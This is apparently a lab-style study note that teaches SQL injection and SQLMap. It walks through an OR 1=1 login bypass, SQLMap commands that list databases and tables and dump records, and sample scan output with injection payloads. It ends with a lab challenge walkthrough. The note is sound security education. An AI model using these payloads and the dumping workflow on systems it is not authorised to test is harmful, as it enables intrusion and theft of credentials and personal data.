# SQL Injection 

## Introduction

### What is a Database ?

A database is an organized collection of data that can be:
- Store data
- Retrieve data
- Modify data
- Delete data

It keeps information in a structured format, making data management fast and efficient.

---

## Why Do Websites Use Databases ?

Most websites need to store user or application data.

### Examples

- **Login Page**

  - Stores usernames and passwords.
  - Verifies credentials during login.

- **Shopping Website**

  - Stores products, prices, and stock.

- **Book Search**

  - Searches the database for matching books and displays the results.

Without a database, websites would have no way to remember users or store information.

---

## How a Website Communicates with a Database

```text
User
  │
  ▼
Browser
  │ HTTP Request
  ▼
Web Server / Web Application
  │
  │ Creates SQL Query
  ▼
DBMS (MySQL, PostgreSQL, SQLite, MSSQL)
  │
  ▼
Database
  │
  │ Returns Results
  ▼
Web Server / Web Application
  │
  │ Generates Response
  ▼
Browser (User Sees Output)
```

### Example

```
User enters:

Username: John
Password: pass123

        │
        ▼
Browser sends HTTP request
        │
        ▼
Web Server

Creates SQL query:

SELECT * FROM users
WHERE username='John'
AND password='pass123';

        │
        ▼
Database

Checks records
        │
        ▼
Returns matching user (or no match)
        │
        ▼
Web Server
        │
        ▼
Browser displays:
✓ Login Successful
or
✗ Invalid Username/Password

The database checks whether such a user exists and returns the result.
```
---

## What is a DBMS ?

A DBMS (Database Management System) is software that manages databases.

It understands SQL (Structured Query Language) and executes SQL queries sent by applications.

### Common DBMS

| DBMS                 | Full Form                    |
| -------------------- | ---------------------------- |
| MySQL                | My Structured Query Language |
| PostgreSQL           | PostgreSQL                   |
| SQLite               | SQLite                       |
| Microsoft SQL Server | Microsoft SQL Server         |

---

## What is SQL ?

SQL (Structured Query Language) is the language used to communicate with databases.

It allows applications to:

- Retrieve data (`SELECT`)
- Insert data (`INSERT`)
- Update data (`UPDATE`)
- Delete data (`DELETE`)
- Create databases/tables (`CREATE`)
- Remove databases/tables (`DROP`)

> Its language builds the interaction between a website and its database
---

## Why Learn This ?

Applications communicate with databases using SQL queries.

If user input is not properly validated, an attacker may manipulate these SQL queries.

This vulnerability is called SQL Injection (SQLi), which tools like SQLMap automate for testing and exploitation.

---

## Key Takeaways

- **Database** → Stores application data.
- **Website** → Sends user input to the database.
- **DBMS** → Executes SQL queries.
- **SQL** → Language used to interact with databases.
- **SQL Injection (SQLi)** → Occurs when attackers manipulate SQL queries through user input.

---

## SQL Injection (SQLi) Vulnerability

## What is SQL Injection ?

SQL Injection (SQLi) is a web vulnerability that occurs when an application does not properly validate or sanitize user input before including it in an SQL query.

This allows an attacker to inject their own SQL code, causing the database to execute unintended commands.

---

## How Login Normally Works ? 

Suppose a user enters:

**Username:** `John`

**Password:** `Un@detectable444`

The application creates the SQL query:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'Un@detectable444';
```

### What happens ?

- Database checks if **both** username and password match.
- If both are correct → Login successful 
- Otherwise → Login fails 

Because `AND` requires **both conditions** to be true.

---

## Vulnerable Login Example

Suppose the application **does not sanitize user input**.

Attacker enters:

**Username**

```
John
```

**Password**

```
abc' OR 1=1;-- -
```

The SQL query becomes:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'abc'
OR 1=1;-- -';
```

---

## How the Attack Works ?

### Step 1

Original condition:

```sql
username='John'
AND
password='abc'
```

Password is incorrect 

---

### Step 2

Injected condition:

```sql
OR 1=1
```

Since

```sql
1 = 1
```

is **always TRUE**, the entire WHERE condition becomes TRUE.

---

### Step 3

The database returns a valid user record.

The attacker is logged in **without knowing the real password**.

---

## Why `'` (Single Quote) is Important ?

The single quote (`'`) closes the original password string.

Without it:

```
abc OR 1=1
```

would simply be treated as the password.

With it:

```sql
password='abc'
OR 1=1
```

the attacker successfully injects a new SQL condition.

---

## Why `-- -` is Used ? 

`--` starts an SQL comment.

Everything after it is ignored by the database.

Example:

```sql
password='abc'
OR 1=1;-- -'
```

becomes effectively:

```sql
password='abc'
OR 1=1
```

This prevents the remaining `'` from causing a syntax error.

---

## Why the Attack Works ?

The application directly inserts user input into an SQL query without validation or parameterization.

As a result, the database executes the attacker's injected SQL instead of treating it as plain text.

---

## Impact of SQL Injection

A successful SQL Injection attack may allow an attacker to:

- Bypass authentication
- Read sensitive data
- Modify database records
- Delete data
- Execute administrative operations
- In some cases, execute OS commands (depending on DBMS configuration)

---

## Visual Flow

```
User Input
      │
      ▼
Website Creates SQL Query
      │
      ▼
Database Executes Query
      │
      ▼
If input is not sanitized
      │
      ▼
Attacker injects SQL code
      │
      ▼
Database executes attacker's SQL
      │
      ▼
Unauthorized access / data compromise
```

---

## Quick Memory Trick

- **Normal User:** Input becomes **data**.
- **Attacker:** Input becomes **SQL code**.

SQL Injection happens when the database cannot distinguish between the two.

---

## Key Points

- SQL Injection occurs due to **improper input validation/sanitization**.
- Attackers inject SQL code into application inputs.
- `'` closes the original string.
- `OR 1=1` is always TRUE and bypasses conditions.
- `--` comments out the remaining query.
- SQL Injection can lead to complete database compromise.

---

## SQLMap - Automated SQL Injection Tool

## What is SQLMap ?

**SQLMap** is an **open-source command-line tool** that automatically:

- Detects SQL Injection (SQLi) vulnerabilities.
- Exploits SQL Injection.
- Enumerates (extracts) information from databases.
- Reduces manual effort during SQL injection testing.

Instead of manually crafting SQL injection payloads, SQLMap performs the testing automatically.

---

## Why Use SQLMap ?

Manual SQL Injection:

```
Find parameter
      ↓
Test payloads manually
      ↓
Check responses
      ↓
Identify SQLi
      ↓
Extract database
      ↓
Extract tables
      ↓
Extract records
```

This process is slow and repetitive.

SQLMap automates all of these steps.

---

## Basic Syntax

```bash
sqlmap [options]
```

Get help:

```bash
sqlmap --help
```

Interactive beginner mode :

```bash
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u):
```

The wizard asks questions (URL, request type, etc.) and builds the command automatically.

Perfect for beginners.

---

## How SQLMap Works ? 

```
Website URL
      │
      ▼
   SQLMap
      │
      ▼
Tests Parameters
      │
      ▼
Detects SQL Injection
      │
      ▼
Identifies Database
      │
      ▼
Extracts Information
```

---

## Step 1 - Find a Parameter

Example URL:

```text
http://site.com/search?cat=1
```

```
Parameter Name → cat
Parameter Value → 1
```

SQLMap tests the parameter (`cat`) for SQL Injection.

## Step 2 - Scan the URL

Command

```bash
sqlmap -u http://site.com/search?cat=1
```

### Meaning

| Option                         | Meaning                            |
| ------------------------------ | ---------------------------------- |
| `sqlmap`                       | Start SQLMap                       |
| `-u`                           | Target URL                         |
| `http://site.com/search?cat=1` | URL containing a parameter to test |

SQLMap will:

- Check if the website is reachable.
- Detect WAF/IDS (if any).
- Identify database type.
- Test SQL Injection payloads.
- Report whether the parameter is vulnerable.

### Example Output

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
      __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
```

### What Does the Output Tell Us ?

The output provides valuable information about the target web application:

| Output | What We Learn |
|---------|---------------|
| Website is reachable | Target URL is accessible. |
| WAF/IPS/IDS check | Whether security protection exists. |
| Content is stable | Page responses are consistent for testing. |
| Dynamic parameter (`cat`) | The parameter affects database queries and is worth testing. |
| SQL Injection found | The parameter is vulnerable to SQL Injection. |
| Injection techniques | Supported SQLi types (Boolean, Error, Time, UNION). |
| Payloads | SQLMap shows the payloads that successfully exploited the vulnerability. |
| Backend DBMS | Database type (e.g., MySQL). |
| Web Server OS | Server operating system (e.g., Ubuntu Linux). |
| Web Technologies | Technologies used (e.g., Nginx, PHP). |

### In Short

From a SQLMap scan, we can determine:

- Whether the website is vulnerable to SQL Injection.
- Which parameter is vulnerable.
- Which SQL Injection techniques work.
- Which database (DBMS) is being used.
- The server's operating system.
- The web server and programming language.
- The successful payloads used by SQLMap.
- Whether the site has basic security protections (WAF/IPS/IDS).

Meaning :

* The **GET parameter `cat`** is vulnerable.
* The website uses **MySQL**.
* Multiple SQL injection techniques are possible.

---

## Common SQL Injection Techniques

| Technique               | How it Works                                                         |
| ----------------------- | -------------------------------------------------------------------- |
| **Boolean-Based Blind** | Sends TRUE/FALSE conditions (e.g. `1=1`) and observes page changes.  |
| **Error-Based**         | Forces database errors to reveal information.                        |
| **Time-Based Blind**    | Uses delays (e.g. `SLEEP(5)`) to infer data when no output is shown. |
| **UNION-Based**         | Uses `UNION SELECT` to retrieve data directly from other tables.     |

---

## Enumerating the Database

Once SQLMap finds SQL Injection, we can extract information.

The process is :

```
 Databases
     ↓
  Tables
     ↓
  Columns
     ↓
  Records
```

---

## Step 3 - List Databases

Command

```bash
sqlmap -u http://site.com/search?cat=1 --dbs
```

Meaning

| Option  | Meaning            |
| ------- | ------------------ |
| `--dbs` | List all databases |

Example Output

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:49:00] [INFO] resuming back-end DBMS' mysql' 
[08:49:00] [INFO] testing connection to the target URL
[08:49:01] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]    
[08:49:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
```

### What Does the Output Tell Us ?

- The target is **vulnerable to SQL Injection** (found in a previous scan and resumed from session).
- The vulnerable **GET parameter** is `cat`.
- The **back-end DBMS** is **MySQL (>= 5.1)**.
- The **Web Server OS** is **Linux Ubuntu**.
- The **Web Technology** used is **Nginx + PHP 5.6.40**.
- SQLMap successfully connected to the target.
- SQLMap enumerated (listed) all available databases.
- The server contains **2 databases**:
  - `users`
  - `members`

### Purpose of `--dbs`

Lists all databases present on the target database server.

```bash
sqlmap -u http://target/search?cat=1 --dbs
```

**Output :**

```text
available databases [2]:
[*] users
[*] members
```

Next step is usually to enumerate tables:

```bash
sqlmap -u URL -D users --tables
```

---

## Step 4 - List Tables

Choose a database.

Example:

```bash
sqlmap -u http://site.com/search?cat=1 -D users --tables
```

Meaning

| Option     | Meaning                                |
| ---------- | -------------------------------------- |
| `-D users` | Select the database named **users**    |
| `--tables` | Display all tables inside the database |

Example Output

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:50:46] [INFO] resuming back-end DBMS' mysql' 
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+

[text removed]
```

### What Does the Output Tell Us ?

- SQLMap selected the **`users`** database (`-D users`).
- The target is still **SQL injectable**.
- The **DBMS** is **MySQL**.
- The server runs **Ubuntu Linux**.
- The web application uses **Nginx + PHP 5.6.40**.
- SQLMap successfully enumerated (listed) the tables in the selected database.
- **3 tables** were found:
  - `johnath`
  - `alexas`
  - `thomas`

### Purpose of `--tables`

Lists all tables inside a selected database.

```bash
sqlmap -u http://target/search?cat=1 -D users --tables
```

**Output:**

```text
Database: users
[3 tables]
johnath
alexas
thomas
```

Next step is to dump the data from a specific table:

```bash
sqlmap -u URL -D users -T thomas --dump
```

---

## Step 5 - Dump Table Records

Choose a table.

Example

```bash
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
```

Meaning

| Option     | Meaning             |
| ---------- | ------------------- |
| `-D users` | Database            |
| `-T thomas` | Table               |
| `--dump`   | Extract all records |

Example Output

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+

[text removed]
```

### What Does the Output Tell Us ?

- SQLMap selected the **`users`** database.
- SQLMap selected the **`thomas`** table.
- SQLMap successfully enumerated the table columns.
- SQLMap extracted (dumped) all records from the table.
- The table contains user information (e.g., name, password, date).
- SQLMap detected a possible password/hash column.

### Purpose of `--dump`

Extracts (dumps) all data from a selected table.

```bash
sqlmap -u http://target/search?cat=1 -D users -T thomas --dump
```

---

## Testing Different Request Types

## 1. GET Request (Most Common)

Example URL

```text
http://site.com/search?cat=1
```

Test with

```bash
sqlmap -u "http://site.com/search?cat=1"
```


## 2. POST Request

Login forms usually send data using POST.

Capture the request with Burp Suite and save it.

Run:

```bash
sqlmap -r request.txt
```

Meaning

| Option | Meaning                             |
| ------ | ----------------------------------- |
| `-r`   | Read a raw HTTP request from a file |


## 3. Cookie-Based Testing

Some pages require login.

Provide your session cookie.

```bash
sqlmap --cookie="PHPSESSID=abcdef123456"
```

This lets SQLMap test pages that require authentication.

---

## Important SQLMap Flags

| Flag       | Purpose                       |
| ---------- | ----------------------------- |
| `--help`   | Show all available options    |
| `--wizard` | Interactive beginner mode     |
| `-u`       | Specify target URL            |
| `-r`       | Read intercepted HTTP request |
| `--cookie` | Supply session cookie         |
| `--dbs`    | List databases                |
| `-D`       | Select a database             |
| `--tables` | List tables                   |
| `-T`       | Select a table                |
| `--dump`   | Dump table contents           |

---

## Understanding Parameters

Example

```text
http://site.com/search?cat=1&page=2
```

```
cat  = Parameter
1    = Value

page = Parameter
2    = Value
```

SQLMap tests **parameters**, not the entire URL.

---

## SQLMap Workflow 

### 1. Find SQL Injection

```bash
sqlmap -u URL
```

Checks whether the target is vulnerable.

### 2. List Databases

```bash
sqlmap -u URL --dbs
```

Finds all databases.

### 3. List Tables

```bash
sqlmap -u URL -D database_name --tables
```

Finds all tables in the selected database.

### 4. Dump Table Data

```bash
sqlmap -u URL -D database_name -T table_name --dump
```

Extracts all records from the selected table.

### 5. Repeat (if needed)

```bash
sqlmap -u URL -D database_name -T another_table --dump
```

Dump data from other interesting tables (e.g., users, products, orders).

---

## 6. Analyze the Extracted Data

Look for:
- Usernames
- Password hashes
- Emails
- API keys
- Personal information
- Configuration data

---

## Quick Revision

- **SQLMap** automates SQL Injection testing.
- Use **`-u`** to scan a URL.
- Use **`--wizard`** for guided mode.
- Use **`--dbs`** to list databases.
- Use **`-D`** to choose a database.
- Use **`--tables`** to list tables.
- Use **`-T`** to choose a table.
- Use **`--dump`** to extract records.
- Use **`-r`** for POST requests.
- Use **`--cookie`** for authenticated testing.
- SQLMap tests **parameters** (e.g., `cat=1`), not just the website URL.

---

## Challenge 

<img width="1918" height="787" alt="image" src="https://github.com/user-attachments/assets/fd0c8810-f2e4-47e6-9298-adeee4e361ff" />

## Step 3: Find the GET Parameters

Since the URL doesn't show parameters directly:

1. Press **F12** (Developer Tools).
2. Open the **Network** tab.
3. Enter any credentials.

Example:

```
Email: test
Password: test
```

4. Click **Login**.
5. A request will appear in the Network tab.
6. Click the request.

<img width="1918" height="842" alt="image" src="https://github.com/user-attachments/assets/8433b9bb-07d4-4508-ac93-ce5c1f65ecf2" />

## Step 4: Copy the Complete URL

You should find something like:

```text
http://10.49.155.150/ai/includes/user_login?email=test&password=test
```

Notice the GET parameters:

```
email=test
password=test
```

These are the parameters SQLMap will test.


